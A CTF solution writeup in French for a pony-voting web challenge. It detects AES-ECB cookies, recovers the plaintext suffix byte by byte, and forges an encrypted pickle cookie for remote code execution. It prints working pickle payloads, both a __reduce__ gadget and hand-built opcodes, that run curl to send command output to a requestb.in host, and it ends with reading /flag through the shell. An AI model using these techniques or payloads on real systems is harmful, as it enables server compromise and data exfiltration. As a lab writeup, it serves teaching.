# Writeup

## Première étape : AES ECB

On nous présente un site web, avec un système d'utilisateur permettant de voter
pour son poney favoris.

Il faut d'abord remarquer que lorsque l'on se connecte, on obtient un cookie en
hexadécimal. Ce cookie contient surement des informations relatif au compte. On
peut se douter qu'il contient l'id de l'utilisateur, au moins.

Il faut penser à créer plusieurs comptes avec des noms d'utilisateurs très
long pour voir que la taille de ce cookie augmente.

En se créant un compte avec l'username XXXXXXXXXXXXXXXXXXXX, on obtient le cookie:
146c0c4e3d2cf71e9adb8b49ade50078775d45d3555a4e2d881de94c90f0609528b57db930b567fc2ed798d26fbb2b42

Avec l'username XXXXXXXXXXXXXXXXXXXY (dernier caractère différent), on obtient:
0fe35a7a39913b66ab3bf3f7116d781a775d45d3555a4e2d881de94c90f06095ce5bc5e4c345a909c627c3f7ffbcbe30

On peut remarquer la répétition de 775d45d3555a4e2d881de94c90f06095, qui fait
exactement 16 octets. On se doute donc que le cookie est chiffré avec un mode
opératoire ECB: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_.28ECB.29

Chaque block est chiffré indépendemment des autres, ce qui rend le chiffrement
très vulnérable. On se doute donc que 'X' * 16 est chiffré en
775d45d3555a4e2d881de94c90f06095.

Au final, on peut se douter que le chiffrement est de l'AES, mais on n'a pas
besoin de cette information pour résoudre le challenge. Il faut uniquement
remarquer que c'est de l'ECB.

## Seconde étape : récupérer le suffixe

On se doute donc que notre cookie est chiffré et contient notre username. Une
attaque courante de l'ECB permet de récupérer tout ce qui est chiffré après
notre username dans le cookie (le suffixe).

cookie = AES-ECB(préfixe + username + suffixe)

La technique est simple: on va d'abord faire en sorte que notre username termine
un block. Pour ça, on va chiffrer 'A' * i, avec i de 1 jusqu'à l'infini, jusqu'à
obtenir 2 fois le même block.

ATTENTION: Comme on doit toujours avoir un username unique, dans mon script,
je préfixe toujours mon username avec 4 caractères aléatoires.
ATTENTION: Si un challenger est bloqué, il faut lui conseiller cette technique.
S'il ajoute seulement 1 ou 2 caractères aléatoires, il va tomber sur des
usernames déjà pris par d'autres équipes (d'après mes tests) et perdre du temps
sans comprendre le problème.

Dans notre cas, on remarque qu'avec un username de longueur 50, on trouve 2
fois le même block:

12abb65223b044a069083688f1a5c380b989aa08f3e62b0cae9bc45cf89f54c05e98d92e0ac1e56557d63a3ef02cb7a65e98d92e0ac1e56557d63a3ef02cb7a6c3b30495a05eaf17b2ae129b6c002d95

Si on découpe en block de 16 octets (donc 32 caractères hexa):

'12abb65223b044a069083688f1a5c380', 'b989aa08f3e62b0cae9bc45cf89f54c0', '5e98d92e0ac1e56557d63a3ef02cb7a6', '5e98d92e0ac1e56557d63a3ef02cb7a6', 'c3b30495a05eaf17b2ae129b6c002d95'
                                                                         username[18:34],                    username[34:50]

Les blocks 3 et 4 sont identiques. On en déduit donc qu'avec un username de
longueur 50 - 2 * 16 = 18, on tombe à la fin d'un block.

On va donc s'enregistrer avec comme username = 'X' * 18 + 'X' * 15, de cette
façon on sait que le 3ième block correspondra a AES-ECB('X' * 15 + suffixe[0]).

On va tester tous les caractères possibles c, on s'enregistre avec
'X' * 18 + ('X' * 15 + c), et on s'arrête quand on retrouve le même block que
précédemment:

AES-ECB('X' * 15 + suffixe[0]) = AES-ECB('X' * 15 + c)

Il faut bien tenter avec toutes les valeurs de c entre 0 et 255.

On peut continuer avec la même technique pour obtenir tout le suffixe.

On obtient: suffixe = 'q\x01Ne.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

Utiliser ./solving_script.py --full pour trouver le même résultat

## Troisième étape: pickle

On se rend compte qu'il s'agit du format pickle: https://docs.python.org/2/library/pickle.html

Ce n'est pas forcément simple à voir, mais le titre du challenge est un indice.

Maintenant, on doit se douter que cookie = AES-ECB(PICKLE([user_id, username, None]))
En fait, le None correspond au vote, mais on s'en fiche.

On sait que pickle n'est pas safe et permet d'éxécuter du code arbitraire:
https://blog.nelhage.com/2011/03/exploiting-pickle/

Ici, on va utiliser le mode ECB pour forger son propre cookie.

Il suffit de s'enregistrer avec username = 'X' * 18 + pickle(16 octets) et de
récupérer le 3-ième block.

On va essayer d'éxécuter os.system('curl -X POST -d "$(id)" http://requestb.in/xxxx'):

```
class A:
    def __reduce__(self):
        return (os.system, (('curl -X POST -d "$(id)" http://requestb.in/xxxx',),))

print(pickle.dumps(A()))
```

### Python 3

En python 3, on obtient:

b'\x80\x03cposix\nsystem\nq\x00X\x1c\x00\x00\x00curl -X POST -d "$(id)" http://requestb.in/xxxxq\x01\x85q\x02\x85q\x03Rq\x04.'

Le problème, c'est que ce payload contient des octets > 128.
Le champ username attend de l'UTF-8, comme on peut se douter. Si l'on injecte
'\x85' par exemple, il va être encodé avec 2 octets en UTF8: '\xc2\x85', ce qui
casse notre pickle.

ATTENTION: Si un challenger est bloqué, il faut peut-être lui parler de ce soucis.

Le challenge est donc de construire un pickle ne contenant que des octets < 128.
Pour ça, il faut se renseigner sur le format de pickle:
https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/gurke_misc_300#eng-version

Personnellement, j'ai regardé directement le code python: /usr/lib/python3.5/pickle.py

Au final, voici mon payload:

```
>>> inject = b'cposix\nsystem\n' # push os.system (load_global)
>>> inject += b'(' # push mark (load_mark)
>>> inject += b'X' + struct.pack('<I', len(cmd)) + cmd # push cmd (load_binunicode)
>>> inject += b't' # stack[k:] = [tuple(stack[k+1:])] (load_tuple)
>>> inject += b'R' # stack[-2](stack[-1]) (load_reduce)
```

On push os.system, puis un marker, puis notre commande, puis on utilise t pour
pop tout jusqu'au marker et construire un tuple, puis on appel reduce.

### Python 2

En python 2, on obtient:

'cposix\nsystem\np0\n((S\'curl -X POST -d "$(id)" http://requestb.in/xxxx\'\np1\ntp2\ntp3\nRp4\n.'

Ce qui ne pose aucun soucis comparé à python 3.

### Injection du payload

NOTE: Au final, l'utilisateur peut crafter son payload avec python 2 ou
python 3, ça devrait marcher (modulo l'UTF-8, voir plus haut).

Ensuite, il suffit de jouer avec les blocks pour former le cookie souhaité. On
veut obtenir: AES(PICKLE([user_id, 'X' * 18, pickle, ...]))

On s'enregistre donc avec 'X' * 18 et on récupère les 2 premiers blocks.
Ensuite, on s'enregistre avec 'X' * 18 + pickle + padding et on récupère les
blocks qui correspondent à notre pickle (donc à partir du 3ième block).
On concatène tout ça, et on fait une requête HTTP avec ce cookie, et bim, le
serveur éxécute notre commande.

Ensuite, on a un shell. Il suffit de remplacer id par la commande voulue.
Pour terminer, on cat /flag, et le résultat doit apparaitre dans le requestb.in
